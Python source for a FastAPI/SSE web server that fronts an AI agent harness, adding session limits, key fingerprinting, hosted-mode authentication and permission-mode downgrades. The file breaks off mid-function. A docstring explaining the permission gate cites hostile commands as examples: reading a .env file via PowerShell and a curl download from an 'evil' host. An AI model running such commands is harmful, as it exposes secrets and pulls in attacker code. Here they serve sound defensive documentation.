"""EvoHarness Web Server — FastAPI + SSE bridge for the Agent runtime.

不改动 agents/ 核心代码：Agent 的所有终端输出都经过 agents.ui 的打印函数，
而 agent.py 以 `from agents.ui import ...` 方式导入了这些函数。这里在
agents.agent 命名空间里原地替换它们，把助手文本流 / 工具调用 / 工具结果
转为 SSE 事件推送给浏览器。
"""

from __future__ import annotations

import asyncio
import contextvars
import ipaddress
import json
import os
import time
from pathlib import Path
import hashlib

from dotenv import find_dotenv, load_dotenv
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, StreamingResponse
from pydantic import BaseModel

ROOT = Path(__file__).resolve().parent.parent
load_dotenv(find_dotenv(usecwd=True) or str(ROOT / ".env"), override=False)

# 必须在替换 ui 函数之后再 import Agent（agent.py 会在导入时绑定这些名字）
import agents.agent as agent_module  # noqa: E402
from agents.agent import Agent  # noqa: E402
from agents.session import is_safe_session_id, load_session  # noqa: E402

# ---------------------------------------------------------------------------
# 事件桥：ContextVar 保存当前请求的事件队列，实现多会话并发隔离
# ---------------------------------------------------------------------------

_current_queue: contextvars.ContextVar[asyncio.Queue | None] = contextvars.ContextVar(
    "evoharness_event_queue", default=None
)


def _emit(event: dict) -> None:
    queue = _current_queue.get()
    if queue is not None:
        queue.put_nowait(event)


def _patch_agent_ui() -> None:
    """把 agent.py 绑定的终端打印函数替换为事件发射器。"""

    def print_assistant_text(text: str) -> None:
        _emit({"type": "text", "data": text})

    def print_tool_call(name: str, inp: dict) -> None:
        _emit({"type": "tool_call", "name": name, "input": _jsonable(inp)})

    def print_tool_result(name: str, result: str) -> None:
        _emit({"type": "tool_result", "name": name, "result": str(result)[:20000]})

    def print_info(msg: str) -> None:
        _emit({"type": "info", "data": str(msg)})

    def print_error(msg: str) -> None:
        _emit({"type": "error", "data": str(msg)})

    def print_retry(*args, **kwargs) -> None:
        _emit({"type": "warn", "data": f"重试中: {args} {kwargs}"})

    def print_confirmation(*args, **kwargs) -> None:
        _emit({"type": "warn", "data": "权限请求（Web 模式自动批准）"})

    def print_sub_agent_start(name: str, *args, **kwargs) -> None:
        _emit({"type": "subagent_start", "data": str(name)})

    def print_sub_agent_end(name: str, *args, **kwargs) -> None:
        _emit({"type": "subagent_end", "data": str(name)})

    def print_cost(*args, **kwargs) -> None:
        _emit({"type": "cost", "data": " ".join(str(a) for a in args)})

    def start_spinner(label: str = "Thinking") -> None:
        _emit({"type": "spinner", "data": label})

    def stop_spinner() -> None:
        _emit({"type": "spinner", "data": None})

    def print_divider(*args, **kwargs) -> None:
        pass

    for name, fn in {
        "print_assistant_text": print_assistant_text,
        "print_tool_call": print_tool_call,
        "print_tool_result": print_tool_result,
        "print_info": print_info,
        "print_error": print_error,
        "print_retry": print_retry,
        "print_confirmation": print_confirmation,
        "print_sub_agent_start": print_sub_agent_start,
        "print_sub_agent_end": print_sub_agent_end,
        "print_cost": print_cost,
        "start_spinner": start_spinner,
        "stop_spinner": stop_spinner,
        "print_divider": print_divider,
    }.items():
        setattr(agent_module, name, fn)


def _jsonable(value):
    try:
        json.dumps(value)
        return value
    except (TypeError, ValueError):
        return str(value)


_patch_agent_ui()

# ---------------------------------------------------------------------------
# API 配置解析（复刻 agents/main.py 的 .env 约定）
# ---------------------------------------------------------------------------


def _clean(value: str | None) -> str | None:
    return value.strip() or None if value else None


def _resolve_api_config() -> tuple[str | None, str | None, bool]:
    generic_key = _clean(os.environ.get("APIKEY")) or _clean(os.environ.get("EVOHARNESS_API_KEY"))
    anthropic_key = _clean(os.environ.get("ANTHROPIC_API_KEY"))
    openai_key = _clean(os.environ.get("OPENAI_API_KEY"))

    generic_base = _clean(os.environ.get("API")) or _clean(os.environ.get("EVOHARNESS_API_BASE"))
    anthropic_base = _clean(os.environ.get("ANTHROPIC_BASE_URL"))
    openai_base = _clean(os.environ.get("OPENAI_BASE_URL"))

    base = generic_base or openai_base or anthropic_base
    key = generic_key or openai_key or anthropic_key
    use_openai = True
    if base and (base.rstrip("/").lower().endswith("/anthropic")):
        use_openai = False
    elif not openai_base and (anthropic_base or anthropic_key) and not generic_base:
        use_openai = False
    return (base if use_openai else None) or None, key, use_openai


API_BASE, API_KEY, USE_OPENAI = _resolve_api_config()
MODEL = _clean(os.environ.get("MODEL")) or "deepseek-chat"


def _env_flag(name: str, default: bool = False) -> bool:
    raw = os.environ.get(name)
    if raw is None:
        return default
    return raw.strip().lower() in ("1", "true", "yes", "on")


def _resolve_bind_host() -> str:
    """运行时绑定地址：EVOHARNESS_HOST > HOST > （有 PORT 则 0.0.0.0，否则本地回环）。"""
    return (
        _clean(os.environ.get("EVOHARNESS_HOST"))
        or _clean(os.environ.get("HOST"))
        or ("0.0.0.0" if os.environ.get("PORT") else "127.0.0.1")
    )


_LOCAL_HOSTS = {"127.0.0.1", "localhost", "::1", "localhost.localdomain"}


def _is_local_host(host: str | None) -> bool:
    """host 是否为本机回环地址（127.0.0.0/8、localhost、::1）。

    严格匹配整个回环段（用 ipaddress 判定），不再用 startswith('127.') 前缀判断——
    否则 '127.evil.com' 这类主机名会被误判为本地，绕过免 key / 本地判定。
    """
    h = (host or "").strip().lower().strip("[]")
    if h in _LOCAL_HOSTS:
        return True
    try:
        return ipaddress.ip_address(h).is_loopback
    except ValueError:
        return False


# 安全开关（默认更安全，均可通过 env 恢复旧行为）：
# - ALLOW_SERVER_KEY：请求未带 api_key 时是否允许回落服务端 .env 的共享额度（默认否）。
# - AUTO_CONFIRM：Web 模式下工具确认是否恒自动批准。默认值随绑定地址变化：本地回环绑定
#   （127.0.0.1）默认开启以保持本地可用；对外绑定（如 Docker 的 HOST=0.0.0.0）默认关闭，
#   避免「暴露在外 + 无鉴权 + 自动批准工具」的组合风险。EVOHARNESS_AUTO_CONFIRM 显式覆盖。
# - LOCAL_NO_KEY_OK：api_base 指向本地/回环时是否允许不带 key（本地 Ollama 等免 key 部署）。
# - CORS：默认只放行本机来源；EVOHARNESS_CORS_ORIGINS 显式配置，设为 * 恢复通配。
ALLOW_SERVER_KEY = _env_flag("EVOHARNESS_ALLOW_SERVER_KEY", default=False)
BIND_HOST = _resolve_bind_host()
AUTO_CONFIRM = _env_flag("EVOHARNESS_AUTO_CONFIRM", default=_is_local_host(BIND_HOST))
# 是否由 env 显式指定 AUTO_CONFIRM：显式值优先，否则请求期会按真实绑定地址再修正一次
# （修复 BIND_HOST 由 env 推导、与 `uvicorn --host 0.0.0.0` 实际监听地址脱节的问题）。
_AUTO_CONFIRM_EXPLICIT = os.environ.get("EVOHARNESS_AUTO_CONFIRM") is not None
LOCAL_NO_KEY_OK = _env_flag("EVOHARNESS_ALLOW_LOCAL_NO_KEY", default=True)
_CORS_ENV = _clean(os.environ.get("EVOHARNESS_CORS_ORIGINS"))
if _CORS_ENV == "*":
    CORS_ORIGINS: list[str] = ["*"]
    CORS_ORIGIN_REGEX: str | None = None
elif _CORS_ENV:
    CORS_ORIGINS = [o.strip() for o in _CORS_ENV.split(",") if o.strip()]
    CORS_ORIGIN_REGEX = None
else:
    CORS_ORIGINS = []
    CORS_ORIGIN_REGEX = r"^https?://(localhost|127\.0\.0\.1)(:\d+)?$"

# ---------------------------------------------------------------------------
# 会话管理
# ---------------------------------------------------------------------------

AGENTS: dict[str, Agent] = {}
LOCKS: dict[str, asyncio.Lock] = {}
RUNNING: dict[str, bool] = {}

# ─── 会话注册表容量与 TTL（W07）─────────────────────────────
# 三个 dict（AGENTS/LOCKS/RUNNING）原本无上限无过期：每个新 session_id 永久驻留，
# 长时间运行 = 内存与锁对象无界增长。TTL 淘汰只清**内存态**；会话历史在磁盘
# （~/.evoharness/sessions/<id>.json），淘汰后仍可经 load_session 恢复。
SESSION_TTL_SECONDS = 6 * 3600        # 6 小时无活动即淘汰
SESSION_MAX_ALIVE = 200               # 硬上限：超过时最久未活动的先淘汰
_SESSION_LAST_SEEN: dict[str, float] = {}


def _now_monotonic() -> float:
    return time.monotonic()


def _touch_session(session_id: str) -> None:
    _SESSION_LAST_SEEN[session_id] = _now_monotonic()


def _evict_stale_sessions(max_alive: int = SESSION_MAX_ALIVE,
                          ttl_seconds: float = SESSION_TTL_SECONDS) -> list[str]:
    """淘汰过期/超限会话的内存态；返回被淘汰的 id 列表。

    RUNNING 的会话不淘汰（正在执行的任务不能被抢掉锁），留到下一轮。
    """
    now = _now_monotonic()
    evicted: list[str] = []
    # 1) TTL 过期
    for sid in list(_SESSION_LAST_SEEN):
        if sid in RUNNING and RUNNING.get(sid):
            continue
        if now - _SESSION_LAST_SEEN.get(sid, now) > ttl_seconds:
            evicted.append(sid)
    # 2) 超限：按 last_seen 最旧先淘汰
    if len(AGENTS) - len(evicted) > max_alive:
        candidates = sorted(
            (sid for sid in AGENTS
             if sid not in evicted and not (RUNNING.get(sid))),
            key=lambda sid: _SESSION_LAST_SEEN.get(sid, 0.0))
        for sid in candidates:
            if len(AGENTS) - len(evicted) <= max_alive:
                break
            evicted.append(sid)
    for sid in evicted:
        agent = AGENTS.pop(sid, None)
        if agent is not None:
            try:
                agent.abort()
            except Exception as error:  # noqa: BLE001
                # abort 失败 = 该会话的后台任务可能仍在跑（僵尸任务）。
                # 对象随后从 AGENTS 移除，但任务本身不会因此停止，必须可见。
                print(f"[sessions] abort failed for {sid}: {type(error).__name__}: {error}")
        LOCKS.pop(sid, None)
        RUNNING.pop(sid, None)
        _SESSION_LAST_SEEN.pop(sid, None)
    return evicted

app = FastAPI(title="EvoHarness")
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_origin_regex=CORS_ORIGIN_REGEX,
    allow_methods=["*"],
    allow_headers=["*"],
)


def _reject_unsafe_session_id(session_id: str) -> None:
    """会话 id 白名单校验：拒绝路径穿越/非法字符，避免拼接出 sessions 目录外的文件。"""
    if not is_safe_session_id(session_id):
        raise HTTPException(status_code=400, detail="非法的 session_id")


def _is_anthropic_base(base_url: str) -> bool:
    return "/anthropic" in (base_url or "").rstrip("/").lower()


def _is_local_api_base(base_url: str | None) -> bool:
    """api_base 是否指向本地/回环主机（localhost / 127.0.0.1 / ::1），用于免 key 部署判定。"""
    raw = (base_url or "").strip().lower()
    if not raw:
        return False
    for scheme in ("http://", "https://"):
        if raw.startswith(scheme):
            raw = raw[len(scheme):]
            break
    host = raw.split("/", 1)[0].split("@")[-1]
    if host.startswith("["):
        host = host[1:].split("]", 1)[0]
    else:
        host = host.split(":", 1)[0]
    return _is_local_host(host)


def _is_exposed_bind(host: str | None) -> bool:
    """真实监听地址是否为对外/通配绑定（0.0.0.0、:: 或非回环 IP）。

    主机名（如 TestClient 的 'testserver'、unix socket 路径）无法判定，返回 False 以免误伤。
    """
    h = (host or "").strip().lower().strip("[]")
    if not h:
        return False
    if h in ("0.0.0.0", "::"):
        return True
    try:
        return not ipaddress.ip_address(h).is_loopback
    except ValueError:
        return False


# ─── 部署模式与托管授权边界（W08） ──────────────────────────────
# local-single-user：回环绑定，单用户本机使用；无账号体系，保留既有保护。
# hosted：对外绑定（0.0.0.0/::/非回环 IP）。此模式下：
#   · 管理写端点（skill tier 晋级/回退、repair apply、stop 别人 session）必须带认证；
#   · 未配置 EVOHARNESS_HOSTED_TOKEN 时拒绝启动（fail-closed），不静默降级。
DEPLOYMENT_MODE = "hosted" if _is_exposed_bind(_resolve_bind_host()) else "local-single-user"
HOSTED_TOKEN = (os.environ.get("EVOHARNESS_HOSTED_TOKEN") or "").strip()
_HOSTED_TOKEN_EXPLICIT = os.environ.get("EVOHARNESS_HOSTED_TOKEN") is not None


def _require_hosted_admin(request: Request, session_id: str | None = None) -> dict | None:
    """托管模式管理写端点的统一门。

    返回 None 表示放行（local 模式直接放行；hosted 模式校验 Bearer token）。
    返回 dict 时是拒绝响应（调用方直接 return）。

    A/B 主体隔离：hosted 模式下管理操作必须声明 owner 主体；历史/stop/恢复等
    跨 session 读写由各端点自行调用本门 + session 归属检查。
    """
    if DEPLOYMENT_MODE != "hosted":
        return None
    auth = (request.headers.get("Authorization") or "").strip()
    expected = f"Bearer {HOSTED_TOKEN}"
    if not auth or auth != expected:
        return {
            "ok": False,
            "error": "hosted 模式管理操作需要认证（Authorization: Bearer <EVOHARNESS_HOSTED_TOKEN>）",
            "deploymentMode": DEPLOYMENT_MODE,
        }
    return None


def _effective_auto_confirm(server) -> bool:
    """请求期按真实绑定地址（ASGI scope['server']）修正 AUTO_CONFIRM。

    BIND_HOST 由 env 推导，与 `uvicorn server.app:app --host 0.0.0.0` 的实际监听地址
    可能脱节：此时 env 推导出 127.0.0.1、AUTO_CONFIRM 默认 True，但服务其实已对外暴露。
    因此对真实为对外/通配绑定的请求，若未显式设置 EVOHARNESS_AUTO_CONFIRM，强制关闭自动批准。
    """
    if _AUTO_CONFIRM_EXPLICIT:
        return AUTO_CONFIRM
    host = server[0] if isinstance(server, (tuple, list)) and server else None
    if _is_exposed_bind(host):
        return False
    return AUTO_CONFIRM


# hosted 模式 fail-closed：无认证凭据时拒绝启动，而不是把管理写入口裸露在外。
# 显式 env EVOHARNESS_ALLOW_UNAUTHED_HOSTED=1 可绕过（仅限明确知道风险的内网部署）。
if DEPLOYMENT_MODE == "hosted" and not HOSTED_TOKEN \
        and not _env_flag("EVOHARNESS_ALLOW_UNAUTHED_HOSTED"):
    raise SystemExit(
        "hosted 模式（对外绑定）未配置 EVOHARNESS_HOSTED_TOKEN：管理写端点（skill 晋级/"
        "repair/stop）会暴露给任何能访问端口的人。请设置 token，或改用回环绑定（local 模式），"
        "或显式设置 EVOHARNESS_ALLOW_UNAUTHED_HOSTED=1 确认接受风险。"
    )


def _resolve_request_config(api_base: str | None, api_key: str | None, model: str | None):
    """用户自带配置（BYOK）优先；缺失时回落到服务端 .env 配置。

    服务端共享额度回落需显式开启 EVOHARNESS_ALLOW_SERVER_KEY=1，否则缺失 BYOK 时
    不静默使用服务端 API_KEY（返回 None，由调用方拒绝）。

    返回 (api_base, api_key, model, use_openai)。"""
    base = (api_base or "").strip() or API_BASE
    key = (api_key or "").strip() or (API_KEY if ALLOW_SERVER_KEY else None)
    name = (model or "").strip() or MODEL
    use_openai = not _is_anthropic_base(base)
    return base, key, name, use_openai


def _apply_web_permissions(agent: Agent, permission_mode: str, allow_confirm: bool) -> None:
    """把请求期的档位与自动批准开关绑定到 Agent（缓存命中复用场景也要重新应用）。

    缓存键（_web_config）只含配置指纹，不含 mode/auto_confirm：若先以
    bypassPermissions + 自动批准建立会话，后续 default/不自动批准的请求命中并原样复用，
    旧档位会泄漏给新请求（对外部署下可被复用来绕过安全门）。故命中缓存时同样重绑。
    """
    agent.permission_mode = permission_mode

    async def auto_confirm(message: str) -> bool:
        if allow_confirm:
            _emit({"type": "warn", "data": f"自动批准: {message}"})
            return True
        # 未自动批准：Web 下工具调用一律拒绝（安全默认 / 对外暴露时强制关闭）
        _emit({"type": "warn", "data": f"已拒绝工具确认（未开启自动批准）: {message}"})
        return False

    async def auto_plan_approval(plan_content: str) -> dict:
        _emit({"type": "info", "data": "Plan 已生成，Web 模式自动继续执行"})
        return {"choice": "execute"}

    agent.set_confirm_fn(auto_confirm)
    agent.set_plan_approval_fn(auto_plan_approval)


def _config_fingerprint(base: str | None, key: str | None, name: str | None) -> tuple:
    """凭据指纹：**完整 key 的 SHA-256**，不是尾部 6 位。

    W07 实测缺陷：旧实现用 `key[-6:]`——两个尾部 6 位相同的不同 key
    （如 "sk-aaa123" 与 "sk-bbb123"）会命中同一指纹 → 复用旧 Agent 凭据，
    用户的请求被记到别人的账上。完整散列无此碰撞面，且日志只落散列不落 key。
    """
    digest = hashlib.sha256((key or "").encode("utf-8")).hexdigest()
    return (base or "", digest, name or "")


def _get_agent(session_id: str, permission_mode: str, api_base: str | None = None,
               api_key: str | None = None, model: str | None = None,
               auto_confirm_enabled: bool | None = None) -> Agent:
    base, key, name, use_openai = _resolve_request_config(api_base, api_key, model)
    # 请求期按真实绑定地址修正后的自动批准开关（None → 用全局 AUTO_CONFIRM）
    allow_confirm = AUTO_CONFIRM if auto_confirm_enabled is None else auto_confirm_enabled
    # 配置指纹：用户换 key/模型后，同会话的旧 Agent 不复用（上下文属于旧配置）
    fingerprint = _config_fingerprint(base, key, name)
    existing = AGENTS.get(session_id)
    if existing is not None and getattr(existing, "_web_config", None) == fingerprint:
        # 命中缓存也重绑：键不含 mode/auto_confirm，不重绑会把旧档位泄漏给本请求。
        _apply_web_permissions(existing, permission_mode, allow_confirm)
        _touch_session(session_id)
        return existing

    # 换凭据/模型：旧 Agent 必须关闭（降档会话上下文属于旧配置，保留只会泄漏），
    # 然后新建——"替换/淘汰关闭旧 Agent"（W07 验收）。
    if existing is not None:
        try:
            existing.abort()
        except Exception as error:  # noqa: BLE001
            # 换凭据时旧 agent 的 abort 失败，可能留下仍在跑的任务。
            print(f"[sessions] abort failed on credential switch for {session_id}: "
                  f"{type(error).__name__}: {error}")
        AGENTS.pop(session_id, None)

    agent = Agent(
        permission_mode=permission_mode,
        model=name,
        api_base=base if use_openai else None,
        anthropic_base_url=base if not use_openai else None,
        api_key=key,
    )
    # Web 会话 id 对齐落盘文件名，重启后可从 ~/.evoharness/sessions/<id>.json 恢复
    agent.session_id = session_id
    saved = load_session(session_id)
    if saved:
        agent.restore_session(saved)

    _apply_web_permissions(agent, permission_mode, allow_confirm)
    agent._web_config = fingerprint
    AGENTS[session_id] = agent
    _touch_session(session_id)
    return agent


class ChatRequest(BaseModel):
    session_id: str
    message: str
    permission_mode: str = "acceptEdits"
    # BYOK：用户自带的模型配置，优先于服务端 .env；不传则回落服务端
    api_base: str | None = None
    api_key: str | None = None
    model: str | None = None


# permission_mode 白名单：只接受已知档；非法值（如 'plan '、'Default'、'foo'）回退到最安全的
# 'default'，避免未知档在 check_permission 里匹配不到任何分支而被静默当作放行。
PERMISSION_MODES = {"default", "plan", "acceptEdits", "bypassPermissions", "dontAsk"}


def _safe_permission_mode(mode: str | None) -> str:
    m = mode or ""
    return m if m in PERMISSION_MODES else "default"


def _gate_permission_mode(mode: str, auto_confirm: bool, exposed_bind: bool = False) -> str:
    """服务端安全门：不会自动批准时，禁止客户端使用危险的自动放行档。

    bypassPermissions 会在 check_permission 里短路一切确认（含「非自动批准 → 拒绝」
    的安全默认）；在 0.0.0.0 等对外部署上，客户端发该档即可无条件跑 shell / 写文件。
    本地部署下降级为 default（run_shell 等仍需确认，将被拒绝）；对外绑定下与 acceptEdits
    一致降级为 dontAsk —— default 档仍会无确认放行「工作区内既有文件」的写
    （write_file/edit_file 指向已存在路径时不触发 confirm），对外等于留下裸写盘口子。

    acceptEdits（ChatRequest 默认档）只对「对外绑定 + 未自动批准」降级：该组合下客户端
    发 acceptEdits 会让非黑名单 shell（如 `powershell -Command Get-Content .env`、
    `curl http://evil/x -o f`）跳过确认直接执行，也可无确认写工作区文件，与 bypass 同样
    危险。降级为 dontAsk（EDIT_TOOLS 写盘 + shell 一律 deny）。本地回环 + 显式关闭自动
    批准的裸跑不受影响（保持 acceptEdits）。
    """
    if not auto_confirm:
        if mode == "bypassPermissions":
            # 对外绑定与 acceptEdits 一致降级到 dontAsk（default 终点仍留有既有文件裸写口子）；
            # 本地回环保持原降级终点 default。
            return "dontAsk" if exposed_bind else "default"
        if mode == "acceptEdits" and exposed_bind:
            # 降级目标取 dontAsk 而非 default：default 档虽拦截非黑名单 shell（走确认 → 被拒），
            # 但仍无确认放行「工作区内既有文件」的写（write_file/edit_file 指向已存在路径时
            # 不触发 confirm），对外部署下等于留下裸写盘口子；dontAsk 才能真正禁掉编辑写盘。
            return "dontAsk"
        if mode == "default" and exposed_bind:
            # Exposed bind + no auto-confirm: an explicit "default" (or an invalid
            # value that _safe_permission_mode falls back to "default") hits the same
            # hole -- default mode leaves write_file/edit_file to existing workspace
            # paths unconfirmed (see tools.check_permission), i.e. an unconfirmed
            # write-through. Downgrade default to dontAsk here (edit writes and
            # non-allowlisted shell are denied). Local loopback is unaffected.
            return "dontAsk"
    return mode


class StopRequest(BaseModel):
    session_id: str


# ---------------------------------------------------------------------------
# Skills 观测台：只读聚合 .evoharness/skill-evolution/ 审计产物，不重写核心逻辑
# ---------------------------------------------------------------------------

EVOLUTION_DIR = ROOT / ".evoharness" / "skill-evolution"
ONLINE_EVAL_DIR = EVOLUTION_DIR / "online-eval"

# 六门槛中文名（顺序：证据量三项 + 质量三项）
GATE_META = [
    # 评测语义 v2：第一门槛为成绩组（使用窗口）样本，非全部回放样本
    ("score", "成绩组样本", "count", "min_score_samples"),
    ("promotion", "晋级集样本", "count", "min_promotion_tests"),
    ("retrieved", "检索判断", "count", "min_retrieved"),
    ("used_rate", "使用率", "rate", "min_used_rate"),
    ("relevance_rate", "相关率", "rate", "min_relevance_rate"),
    ("rule_pass", "规则通过率", "rate", "min_rule_pass_rate"),
]


def _read_json_file(path: Path):
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:  # noqa: BLE001
        return None


def _read_jsonl_file(path: Path) -> list[dict]:
    """读 JSONL；坏行与整文件失败不再静默，而是记入 last_jsonl_errors。

    旧实现两层静默：坏行跳过、整文件异常返回空列表。前端看到的是"没有数据"，
    无法区分"真的没有"与"文件坏了/权限不够"。
    """
    global last_jsonl_errors
    rows: list[dict] = []
    last_jsonl_errors = []
    try:
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError) as error:
        last_jsonl_errors.append({"file": path.name, "kind": "read-failed",
                                  "reason": f"{type(error).__name__}: {error}"[:160]})
        return rows
    for index, line in enumerate(text.splitlines(), start=1):
        line = line.strip()
        if not line:
            continue
        try:
            rows.append(json.loads(line))
        except ValueError as error:
            last_jsonl_errors.append({"file": path.name, "kind": "bad-line", "line": index,
                                      "reason": str(error)[:120]})
    return rows


# 最近一次 JSONL 读取跳过/失败的原因（供接口把"文件坏了"与"没有数据"分开）。
last_jsonl_errors: list[dict] = []


def _display_messages(openai_messages: list | None, anthropic_messages: list | None) -> list[dict]:
    """从两种协议的消息历史里提取可展示对话（过滤系统/工具/注入内容）。"""
    out: list[dict] = []
    if openai_messages:
        for m in openai_messages:
            role = m.get("role")
            content = m.get("content")
            if role in ("user", "assistant") and isinstance(content, str) and content.strip():
                # 剥离检索注入的 skills 上下文块（非用户真实输入）
                text = content.split("<retrieved_skills>")[0].rstrip()
                if text.strip():
                    out.append({"role": role, "text": text[:20000]})
    elif anthropic_messages:
        for m in anthropic_messages:
            role = m.get("role")
            content = m.get("content")
            if role == "user" and isinstance(content, str) and content.strip():
                text = content.split("<retrieved_skills>")[0].rstrip()
                if text.strip():
                    out.append({"role": "user", "text": text[:20000]})
            elif role == "assistant" and isinstance(content, list):
                text = "".join(
                    str(b.get("text") or "")
                    for b in content
                    if isinstance(b, dict) and b.get("type") == "text"
                ).strip()
                if text:
                    out.append({"role": "assistant", "text": text[:20000]})
    return out


@app.get("/api/history")
async def history(session_id: str):
    """会话历史：优先读内存 Agent；服务重启后从落盘文件恢复展示。"""
    _reject_unsafe_session_id(session_id)
    agent = AGENTS.get(session_id)
    if agent is not None:
        if agent.use_openai:
            return {"messages": _display_messages(agent._openai_messages, None)}
        return {"messages": _display_messages(None, agent._anthropic_messages)}
    saved = load_session(session_id)
    if saved:
        return {"messages": _display_messages(saved.get("openaiMessages"), saved.get("anthropicMessages"))}
    return {"messages": []}


@app.get("/api/skills")
async def skills_overview():
    report = _read_json_file(EVOLUTION_DIR / "online_eval_report.json") or {}
    usage_stats = _read_json_file(EVOLUTION_DIR / "skill_usage_stats.json") or {}
    champions = (_read_json_file(ONLINE_EVAL_DIR / "champions.json") or {}).get("champions", {})
    events = _read_jsonl_file(EVOLUTION_DIR / "usage.jsonl")

    raw_thresholds = report.get("thresholds") or {}
    # v2 字段名 min_score_samples；旧报告用 min_replay_samples（语义已改为成绩组样本）
    thresholds = {
        "min_score_samples": int(raw_thresholds.get("min_score_samples")
                                 or raw_thresholds.get("min_replay_samples") or 3),
        "min_promotion_tests": int(raw_thresholds.get("min_promotion_tests") or 1),
        "min_retrieved": int(raw_thresholds.get("min_retrieved") or 5),
        "min_used_rate": float(raw_thresholds.get("min_used_rate") or 0.2),
        "min_relevance_rate": float(raw_thresholds.get("min_relevance_rate") or 0.35),
        "min_rule_pass_rate": float(raw_thresholds.get("min_rule_pass_rate") or 0.8),
    }

    skills_out: list[dict] = []
    for item in report.get("skills", []):
        name = str(item.get("skill") or "")
        usage = usage_stats.get(name, {}) if isinstance(usage_stats, dict) else {}
        replay = item.get("replay") or {}
        ev = item.get("eval") or {}
        # 评测语义 v2：成绩组（使用窗口）样本 = replay.count - evidence 组；
        # 旧报告无分组字段时全部样本都是证据组（决策窗口出身），成绩组为 0
        evidence_count = int(replay.get("evidence", 0) or 0)
        score_count = max(0, int(replay.get("count", 0) or 0) - evidence_count)
        current = {
            "score": score_count,
            "promotion": int(replay.get("promotion_test", 0) or 0),
            "retrieved": int(item.get("retrieved", 0) or 0),
            "used_rate": float(item.get("used_rate", 0.0) or 0.0),
            "relevance_rate": float(item.get("relevance_rate", 0.0) or 0.0),
            "rule_pass": float(ev.get("pass_rate", 0.0) or 0.0),
        }
        gates = []
        for key, label, kind, threshold_key in GATE_META:
            required = thresholds.get(threshold_key, 0)
            gates.append({
                "key": key, "label": label, "kind": kind,
                "current": current[key], "required": required,
                "ok": current[key] >= float(required),
            })
        # 检索权重（与核心运行时约定一致：healthy ×1.25 / watch ×0.75，孵化期不动）
        status = str(item.get("status") or "")
        weight = 1.0
        if status == "healthy":
            weight = 1.25
        elif status == "watch":
            weight = 0.75
        skills_out.append({
            "skill": name,
            "status": status,
            "reasons": item.get("reasons", []),
            "lineage_id": item.get("lineage_id", ""),
            "current_version": item.get("current_version", ""),
            "source": usage.get("source", ""),
            "last_action": item.get("last_action", ""),
            "last_time": item.get("last_time", ""),
            "counts": {
                "retrieved": int(item.get("retrieved", 0) or 0),
                "relevant": int(item.get("relevant", 0) or 0),
                "used": int(item.get("used", 0) or 0),
                "created": int(item.get("created", 0) or 0),
                "evolutions": int(item.get("evolutions", 0) or 0),
                "invocations": int(item.get("invocations", 0) or 0),
                "feedback": int(item.get("feedback", 0) or 0),
            },
            "rates": {
                "used_rate": current["used_rate"],
                "relevance_rate": current["relevance_rate"],
                "used_when_relevant_rate": float(item.get("used_when_relevant_rate", 0.0) or 0.0),
            },
            "replay": {
                "count": int(replay.get("count", 0) or 0),
                # v2 双组：evidence=决策窗口样本（只诊断，不进门槛）；score=成绩组
                "evidence": evidence_count,
                "score": score_count,
                "mutate_dev": int(replay.get("mutate_dev", 0) or 0),
                "promotion_test": current["promotion"],
                "sources": replay.get("sources", []),
            },
            "eval": {
                "total_score": float(ev.get("total_score", 0.0) or 0.0),
                "average_score": float(ev.get("average_score", 0.0) or 0.0),
                "pass_rate": current["rule_pass"],
                "hard_failures": int(ev.get("hard_failures", 0) or 0),
                "promotion_test_pass_rate": float(ev.get("promotion_test_pass_rate", 0.0) or 0.0),
                "by_rule": ev.get("by_rule", []),
            },
            "candidate_eval": {
                "candidate_count": int((item.get("candidate_eval") or {}).get("candidate_count", 0) or 0),
                "best_candidate": (item.get("candidate_eval") or {}).get("best_candidate", {}),
                "has_promotion_test_eval": bool((item.get("candidate_eval") or {}).get("has_promotion_test_eval")),
            },
            "gates": gates,
            "retrieval_weight": weight,
            "champion": champions.get(str(item.get("lineage_id") or "")),
            "last_reason": usage.get("last_reason", ""),
            "last_score": float(usage.get("last_score", 0.0) or 0.0),
        })

    events_out = [
        {
            "skill": str(e.get("skill") or ""),
            "event": str(e.get("event") or ""),
            "time": str(e.get("time") or ""),
            "context": str(e.get("context") or ""),
            "source": str(e.get("source") or ""),
            "args_preview": str(e.get("args_preview") or "")[:120],
        }
        for e in events[-200:]
    ][::-1]

    # 加载层溯源：SKILL.md 解析失败（load_failed）或静默行为改变（load_warning）的最近记录。
    # 每条附实时状态：repairable=文件存在且异常仍在；fixed=文件存在但已无此异常；
    # gone=文件已不存在（测试残留/已删除），前端据此降级展示。
    from agents.skill_repair import _classify, _verify_current_state

    raw_errors = _read_jsonl_file(EVOLUTION_DIR / "skill_load_errors.jsonl")
    load_errors = []
    for e in raw_errors[-50:][::-1]:
        item = dict(e)
        item["state"] = _verify_current_state(str(e.get("file") or ""), _classify(str(e.get("event") or ""), str(e.get("reason") or e.get("error") or "")))
        load_errors.append(item)

    return {
        "generated_at": report.get("generated_at", ""),
        "thresholds": thresholds,
        "aggregate": report.get("aggregate", {}),
        "skills": skills_out,
        "events": events_out,
        "load_errors": load_errors,
        "champion_count": len(champions) if isinstance(champions, dict) else 0,
        "has_report": bool(report),
    }


# ---------------------------------------------------------------------------
# SKILL.md 加载异常：建议修复 + 一键应用（备份 + 重载验证 + 失败回滚）
# ---------------------------------------------------------------------------

class RepairRequest(BaseModel):
    file: str
    event: str
    reason: str = ""


def _allowed_repair_roots() -> list[Path]:
    """修复端点允许的 skills 根：项目级 + 用户级 .evoharness/skills。"""
    return [
        Path.cwd() / ".evoharness" / "skills",
        Path.home() / ".evoharness" / "skills",
    ]


def _is_allowed_repair_file(file_str: str) -> bool:
    """只允许 skills 根内的 .md 文件：拒绝任意路径读写与 .bak 残留越界。"""
    if not isinstance(file_str, str) or not file_str.strip():
        return False
    path = Path(file_str)
    if path.suffix.lower() != ".md":
        return False
    try:
        target = path.resolve()
    except OSError:
        return False
    for root in _allowed_repair_roots():
        try:
            resolved_root = root.resolve()
        except OSError:
            continue
        if target == resolved_root or resolved_root in target.parents:
            return True
    return False


@app.post("/api/skills/repair/suggest")
async def repair_suggest(req: RepairRequest):
    from agents.skill_repair import build_repair_suggestion

    if not _is_allowed_repair_file(req.file):
